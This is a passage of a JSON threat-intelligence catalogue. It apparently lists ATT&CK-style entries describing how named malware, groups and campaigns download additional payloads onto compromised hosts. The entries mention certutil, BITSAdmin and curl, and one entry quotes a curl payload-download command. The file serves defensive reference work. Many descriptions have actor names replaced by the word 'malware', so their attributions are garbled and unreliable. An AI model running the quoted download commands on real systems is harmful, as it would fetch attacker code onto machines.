                "Description": "malware had downloaded additional tools to a compromised host.[268]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has downloaded additional scripts and files from adversary-controlled servers.[280][118]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware has the ability to download and execute additional files.[281]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can download files onto compromised hosts.[282]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware has the ability to download files.[283]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware has the ability to download payloads containing system commands to a compromised host.[284]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can download additional plugins, files, and tools.[285]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware downloaded several staged items onto the victim's machine.[286]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware used SCP to update the miner from the C2.[287]"
            },
            "S0042": {
                "ID": "S0042",
                "Name": "LOWBALL",
                "Description": "malware uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the malware malware.[288]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can download and execute a replica of itself using certutil.[289]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has downloaded additional malware and tools onto a compromised host.[290][291]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware can download additional files for execution on the victim\u2019s machine.[292]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has downloaded additional files, including an exploit for used privilege escalation.[293][294]"
            },
            "S1048": {
                "ID": "S1048",
                "Name": "macOS.OSAMiner",
                "Description": "malware has used curl to download a Stripped Payloads from a public facing adversary-controlled webpage."
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can download additional files onto the compromised host.[295]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has downloaded additional code and files from servers onto victims.[296][297][298][299]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can download additional files and tools from its C2 server, including through the use of BITSAdmin.[300]"
            },
            "S0500": {
                "ID": "S0500",
                "Name": "MCMD",
                "Description": "malware can upload additional files to a compromised host.[301]"
            },
            "S0459": {
                "ID": "S0459",
                "Name": "MechaFlounder",
                "Description": "malware has the ability to upload and download files to and from a compromised host.[302]"
            },
            "S0530": {
                "ID": "S0530",
                "Name": "Melcoz",
                "Description": "malware has the ability to download additional files to a compromised host.[47]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has installed updates and new malware on victims.[303][304]"
            },
            "G1013": {
                "ID": "G1013",
                "Name": "Metador",
                "Description": "malware has downloaded tools and malware onto a compromised system.[305]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can download files onto compromised systems.[305][295]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has used MSI files to download additional files to execute.[306][307][308][309]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware has the ability to download additional files for execution on the victim's machine.[310]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware can download and execute an executable from the C2 server.[311][312]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware has received files from C2 and stored them in log folders beginning with the character sequence a9850d2f.[313]"
            },
            "S0051": {
                "ID": "S0051",
                "Name": "MiniDuke",
                "Description": "malware can download additional encrypted backdoors onto the victim via GIF files.[314][283]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has downloaded additional malware and files onto a compromised host.[315]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware is capable of downloading files from the C2.[315]"
            },
            "S0080": {
                "ID": "S0080",
                "Name": "Mivast",
                "Description": "malware has the capability to download and execute .exe files.[316]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware has a command to download a file from the C2 server to the victim mobile device's SD card.[102]"
            },
            "S0553": {
                "ID": "S0553",
                "Name": "MoleNet",
                "Description": "malware can download additional payloads from the C2.[170]"
            },
            "G0021": {
                "ID": "G0021",
                "Name": "Molerats",
                "Description": "malware used executables to download malicious files from different sources.[317][318]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware can download files to targeted systems.[319]"
            },
            "S0284": {
                "ID": "S0284",
                "Name": "More_eggs",
                "Description": "malware can download and launch additional payloads.[320][321]"
            },
            "G1009": {
                "ID": "G1009",
                "Name": "Moses Staff",
                "Description": "malware has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.[322]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware can upload and download files to the victim.[323]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that can upload additional files to the victim\u2019s machine.[324][325][326][327]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has downloaded additional executables following the initial infection stage.[328]"
            },
            "G1020": {
                "ID": "G1020",
                "Name": "Mustard Tempest",
                "Description": "malware has deployed secondary payloads and third stage implants to compromised hosts.[329]"
            },
            "S0228": {
                "ID": "S0228",
                "Name": "NanHaiShu",
                "Description": "malware can download additional files from URLs.[280]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware has the capability to download and activate additional modules for execution.[330][331]"
            },
            "S0247": {
                "ID": "S0247",
                "Name": "NavRAT",
                "Description": "malware can download files remotely.[332]"
            },
            "S0272": {
                "ID": "S0272",
                "Name": "NDiskMonitor",
                "Description": "malware can download and execute a file from given URL.[62]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware can download files from C2.[333]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can download additional files onto a compromised host.[259]"
            },
            "S0210": {
                "ID": "S0210",
                "Name": "Nerex",
                "Description": "malware creates a backdoor through which remote attackers can download files onto a compromised host.[179]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "Operators deploying malware have used psexec and certutil to retrieve the malware payload.[334]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can downloaded payloads from C2 to the compromised host.[335][336]"
            },
            "S0118": {
                "ID": "S0118",
                "Name": "Nidiran",
                "Description": "malware can download and execute files.[337]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used administrative utilities to deliver Trojan components to remote systems.[338]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can load multiple additional plugins on an infected host.[162]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can download files to the victim\u2019s machine.[339][340]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware has downloaded a remote module for execution.[341]"
            },
            "G0133": {
                "ID": "G0133",
                "Name": "Nomadic Octopus",
                "Description": "malware has used malicious macros to download additional files to the victim's machine.[342]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can download additional files and tools onto the victim\u2019s machine.[343][344][342]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware can download remote files onto victims.[345]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware has built-in commands for uploading, downloading, and executing files to the system.[346]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware can download files from its C2 server to the victim's machine.[347][348]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group downloaded multistage malware and tools onto a compromised host.[169][349][350]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors downloaded additional malware and malicious scripts onto a compromised host.[351]"
            },
            "C0013": {
                "ID": "C0013",
                "Name": "Operation Sharpshooter",
                "Description": "During malware, additional payloads were downloaded after a target was infected with a first-stage downloader.[352]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors downloaded additional files to the infected system.[353]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can download files onto the victim.[280]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware can download payloads, and extract bytes from files. malware uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory.[354][355][356][357]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware has a command to download and execute a file on the victim\u2019s machine.[358][359]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can download files from its C2 server.[181]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware can upload and download files to and from compromised hosts.[189]"
            },
            "S0626": {
                "ID": "S0626",
                "Name": "P8RAT",
                "Description": "malware can download additional payloads to a target system.[176]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can load additional drivers and files onto a victim machine.[360]"
            },
            "S0208": {
                "ID": "S0208",
                "Name": "Pasam",
                "Description": "malware creates a backdoor through which remote attackers can upload files.[361]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware payloads download additional files from the C2 server.[362][62]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can execute the command code do_download to retrieve remote files from C2.[363]"
            },
            "S0643": {
                "ID": "S0643",
                "Name": "Peppy",
                "Description": "malware can download and execute remote files.[139]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can install additional modules via C2 commands.[364]"
            },
            "S0124": {
                "ID": "S0124",
                "Name": "Pisloader",
                "Description": "malware has a command to upload a file to the victim machine.[365]"
            },
            "S0254": {
                "ID": "S0254",
                "Name": "PLAINTEE",
                "Description": "malware has downloaded and executed additional plugins.[157]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has transferred files using the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel.[366]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to upload and download files to and from an infected host.[367]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module to download and execute files on the compromised machine.[368][369]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.[370][371]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware creates a backdoor through which remote attackers can upload files.[372]"
            },
            "S0518": {
                "ID": "S0518",
                "Name": "PolyglotDuke",
                "Description": "malware can retrieve payloads from the C2 server.[283]"
            },
            "S0453": {
                "ID": "S0453",
                "Name": "Pony",
                "Description": "malware can download additional files onto the infected system.[373]"
            },
            "S0150": {
                "ID": "S0150",
                "Name": "POSHSPY",
                "Description": "malware downloads and executes additional PowerShell code and Windows binaries.[374]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has a command to download a file.[375]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware can download additional payloads to a compromised host.[376]"
            },
            "S0685": {
                "ID": "S0685",
                "Name": "PowerPunch",
                "Description": "malware can download payloads from adversary infrastructure.[213]"
            },
            "S0145": {
                "ID": "S0145",
                "Name": "POWERSOURCE",
                "Description": "malware has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.[377]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can retrieve and execute additional PowerShell payloads from the C2 server.[378]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware can download or upload files from its C2 server.[345]"
            },
            "S0613": {
                "ID": "S0613",
                "Name": "PS1",
                "Description": "CostaBricks can download additional payloads onto a compromised host.[137]"
            },
            "S0078": {
                "ID": "S0078",
                "Name": "Psylo",
                "Description": "malware has a command to download a file to the system from its C2 server.[102]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware can download and execute additional files.[210][379][380]"
            },
            "S0196": {
                "ID": "S0196",
                "Name": "PUNCHBUGGY",
                "Description": "malware can download additional files and payloads to compromised hosts.[381][382]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can upload and download to/from a victim machine.[383]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability to download additional components and malware.[384][385][386][387][388][389]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can download files to the victim\u2019s machine and execute them.[390][391]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware can download and execute payloads on a target host.[213]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can download files to a compromised host.[333]"
            },
            "G0075": {
                "ID": "G0075",
                "Name": "Rancor",
                "Description": "malware has downloaded additional malware, including by using certutil.[157]"
            },
            "S0055": {
                "ID": "S0055",
                "Name": "RARSTONE",
                "Description": "malware downloads its backdoor component from a C2 server and loads it directly into memory.[392]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware uploads and downloads information.[393][394]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware has the ability to drop additional files to an infected machine.[395]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware can download files via DNS.[396]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware is capable of downloading a file from a specified URL.[397]"
            },
            "S0511": {
                "ID": "S0511",
                "Name": "RegDuke",
                "Description": "malware can download files from C2.[283]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware can upload and download files to and from the victim\u2019s machine.[398]"
            },
            "S0166": {
                "ID": "S0166",
                "Name": "RemoteCMD",
                "Description": "malware copies a file over to the remote system before execution.[399]"
            },
            "S0592": {
                "ID": "S0592",
                "Name": "RemoteUtilities",
                "Description": "malware can upload and download files to and from a target machine.[327]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.[400][401]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware has the ability to upload and download files.[402]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can download a copy of itself from an attacker controlled IP address to the victim machine.[403][404][405]"
            },
            "S0258": {
                "ID": "S0258",
                "Name": "RGDoor",
                "Description": "malware uploads and downloads files to and from the victim\u2019s machine.[406]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware used malware to download additional malicious files to the target system.[407]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware can save a new file to the system from the C2 server.[408][409]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can retrieve additional malicious payloads from its C2 server.[410][411][35][412]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can download additional files.[413][414]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware can download additional files onto a compromised host.[315]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can download additional files onto a compromised host.[181]"
            },
            "S0074": {
                "ID": "S0074",
                "Name": "Sakula",
                "Description": "malware has the capability to download files.[415]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware has been used to deploy other malware including Ninja.[122]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.[416][417]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to upload additional malicious files to a compromised machine.[418]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to download a DLL from C2 to a compromised host.[419]"
            },
            "S0053": {
                "ID": "S0053",
                "Name": "SeaDuke",
                "Description": "malware is capable of uploading and downloading files.[420]"
            },
            "S0345": {
                "ID": "S0345",
                "Name": "Seasalt",
                "Description": "malware has a command to download additional files.[71][71]"
            },
            "S0185": {
                "ID": "S0185",
                "Name": "SEASHARPEE",
                "Description": "malware can download remote files onto victims.[421]"
            },
            "S0382": {
                "ID": "S0382",
                "Name": "ServHelper",
                "Description": "malware may download additional files to execute.[422][423]"
            },
            "S0639": {
                "ID": "S0639",
                "Name": "Seth-Locker",
                "Description": "malware has the ability to download and execute files on a compromised host.[424]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has downloaded code from a C2 server.[425]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware can download an executable to run on the victim.[426]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware  can download additional files from its C2 via HTTP or DNS.[313][427]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware has been used to download a Python interpreter to C:\\Users\\Public\\WinTN\\WinTN.exe as well as other plugins from external sources.[162]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware has the ability to download and execute additional payloads via a DropBox API.[170][171]"
            },
            "S0450": {
                "ID": "S0450",
                "Name": "SHARPSTATS",
                "Description": "malware has the ability to upload and download files.[428]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware can download additional files.[429]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware had the ability to download additional payloads.[429]"
            },
            "S0217": {
                "ID": "S0217",
                "Name": "SHUTTERSPEED",
                "Description": "malware can download and execute an arbitary executable.[32]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware can download and execute a payload onto a compromised system.[220]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.[7]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has the ability to download additional files.[430]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used LNK files to download remote files to the victim's network.[431][432]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has downloaded additional modules and malware to victim\u2019s machines.[433]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can load additional files and tools, including Mimikatz.[434]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware has the ability to download files on an infected host.[435]"
            },
            "S1110": {
                "ID": "S1110",
                "Name": "SLIGHTPULSE",
                "Description": "RAPIDPULSE can transfer files to and from compromised hosts.[436]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can upload files from the C2 server to the victim machine using the upload command.[437]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has downloaded files onto a victim machine.[438]"
            },
            "S0218": {
                "ID": "S0218",
                "Name": "SLOWDRIFT",
                "Description": "malware downloads additional payloads.[32]"
            },
            "S1035": {
                "ID": "S1035",
                "Name": "Small Sieve",
                "Description": "malware has the ability to download files.[439]"
            },
            "S0226": {
                "ID": "S0226",
                "Name": "Smoke Loader",
                "Description": "malware downloads a new version of itself once it has installed. It also downloads additional plugins.[440]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has used Powershell to download UltraVNC and ngrok from third-party file sharing sites.[441]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware can download additional payloads to compromised systems.[442][443]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can download additional malware to infected hosts.[444][445]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware has the ability to download additional payloads from C2 to the targeted system.[176]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.[446]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has the ability to download and execute additional payloads.[137][158][447]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can download additional payloads from C2.[448][449]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware downloads and executes additional files from a remote server. [450]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware can download malicious files from threat actor controlled AWS URL's.[451]"
            },
            "S0390": {
                "ID": "S0390",
                "Name": "SQLRat",
                "Description": "malware can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.[452]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has downloaded and executed additional encoded payloads.[453][454]"
            },
            "S1112": {
                "ID": "S1112",
                "Name": "STEADYPULSE",
                "Description": "malware can add lines to a Perl script on a targeted server to import additional Perl modules.[455]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.[456]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can download updates and auxiliary modules.[457]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can download files to specified targets.[458]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware delivered different payloads, including TEARDROP in at least one instance.[446]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware has the ability to download additional tools such as the RedLine Stealer to an infected host.[459]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware has the ability to download files to a compromised host.[360][460]"
            },
            "G1018": {
                "ID": "G1018",
                "Name": "TA2541",
                "Description": "malware has used malicious scripts and macros with the ability to download additional payloads.[461]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has downloaded additional malware to execute on victim systems.[462][423][463]"
            },
            "G0127": {
                "ID": "G0127",
                "Name": "TA551",
                "Description": "malware has retrieved DLLs and installer binaries for malware execution from C2.[464]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware has downloaded additional files onto a compromised host.[465]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can download additional modules from its C2 server.[466]"
            },
            "S0164": {
                "ID": "S0164",
                "Name": "TDTESS",
                "Description": "malware has a command to download and execute an additional file.[467]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has the curl and wget commands as well as batch scripts to download new tools.[468][469]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware can download and execute payloads in-memory or from disk.[470]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has downloaded additional malware and tools, including through the use of certutil, onto a compromised host .[238][471]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can download additional tools to enable lateral movement.[275]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware has the ability to act as a second-stage dropper used to infect the system with additional malware.[472]"
            },
            "S0671": {
                "ID": "S0671",
                "Name": "Tomiris",
                "Description": "malware can download files and execute them on a victim's system.[473]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has downloaded malicious DLLs which served as a ShadowPad loader.[474]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware downloads several additional files and saves them to the victim's machine.[475][476]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can upload, download, and execute files on the victim.[477][478]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has used a delivered trojan to download additional files.[479]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to upload and download files to and from the infected host.[480]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can download additional files and tools from its C2.[57]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used shellcode to download Meterpreter after compromising a victim.[481]"
            },
            "S0199": {
                "ID": "S0199",
                "Name": "TURNEDUP",
                "Description": "malware is capable of downloading additional files.[482]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "malware can upload and download files to the victim\u2019s machine.[483]"
            },
            "S0333": {
                "ID": "S0333",
                "Name": "UBoatRAT",
                "Description": "malware can upload and download files to the victim\u2019s machine.[484]"
            },
            "S0130": {
                "ID": "S0130",
                "Name": "Unknown Logger",
                "Description": "malware is capable of downloading remote files.[60]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware can download and upload files to and from the victim\u2019s machine.[485]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use a Put command to write files to an infected machine.[486]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has dropped payload and configuration files to disk. malware has also been used to download and execute additional payloads.[487][488]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.[489][490]"
            },
            "S0636": {
                "ID": "S0636",
                "Name": "VaporRage",
                "Description": "malware has the ability to download malicious shellcode to compromised systems.[82]"
            },
            "S0207": {
                "ID": "S0207",
                "Name": "Vasport",
                "Description": "malware can download files.[491]"
            },
            "S0442": {
                "ID": "S0442",
                "Name": "VBShower",
                "Description": "malware has the ability to download VBS files to the target computer.[492]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware can download and upload files to the victim's machine.[493]"
            },
            "G0123": {
                "ID": "G0123",
                "Name": "Volatile Cedar",
                "Description": "malware can deploy additional tools.[109]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can download remote files and additional payloads to the victim's machine.[494][495][496]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can download and execute additional files.[497]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can receive and load executables from remote C2 servers.[498]"
            },
            "S0109": {
                "ID": "S0109",
                "Name": "WEBC2",
                "Description": "malware can download and execute a file.[499]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can receive data and executable scripts from C2.[500]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can write files to a compromised host.[25][501]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can download additional stages of malware from a Discord CDN channel.[502][503][504][505]"
            },
            "G0107": {
                "ID": "G0107",
                "Name": "Whitefly",
                "Description": "malware has the ability to download additional tools from the C2.[506]"
            },
            "S0206": {
                "ID": "S0206",
                "Name": "Wiarp",
                "Description": "malware creates a backdoor through which remote attackers can download files.[507]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used tools to deploy additional payloads to compromised hosts.[508]"
            },
            "S0430": {
                "ID": "S0430",
                "Name": "Winnti for Linux",
                "Description": "malware has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. [509]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "The malware dropper can place malicious payloads on targeted systems.[510]"
            },
            "G0044": {
                "ID": "G0044",
                "Name": "Winnti Group",
                "Description": "malware has downloaded an auxiliary program named ff.exe to infected machines.[511]"
            },
            "S1115": {
                "ID": "S1115",
                "Name": "WIREFIRE",
                "Description": "malware has the ability to download files to compromised devices.[512]"
            },
            "G0090": {
                "ID": "G0090",
                "Name": "WIRTE",
                "Description": "malware has downloaded PowerShell code from the C2 server to be executed.[513]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware can transfer malicious payloads such as ransomware to compromised machines.[514]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
